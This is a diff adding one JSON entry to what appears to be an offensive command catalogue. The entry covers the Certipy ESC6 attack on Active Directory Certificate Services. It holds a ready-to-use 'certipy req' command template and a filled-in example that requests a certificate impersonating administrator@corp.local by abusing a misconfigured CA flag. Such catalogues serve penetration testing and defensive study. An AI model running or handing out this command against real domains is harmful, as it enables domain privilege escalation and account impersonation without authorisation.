@@ -1,0 +1,16 @@
+{
+  "id": "certipy-esc6",
+  "name": "Certipy ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)",
+  "command": "certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca-name>' -template User -upn '<target>@<domain>'",
+  "description": "ESC6: the CA has EDITF_ATTRIBUTESUBJECTALTNAME2 set, allowing any enrollee to specify an arbitrary SAN on any template — instant impersonation against the User template.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["ldap"],
+  "tags": ["certipy", "adcs", "esc6", "san", "ca-misconfig"],
+  "references": [
+    { "title": "Certipy ESC6", "url": "https://github.com/ly4k/Certipy" }
+  ],
+  "examples": [
+    "certipy req -u jdoe@corp.local -p Pass -dc-ip 10.10.10.10 -ca CORP-CA -template User -upn administrator@corp.local"
+  ]
+}
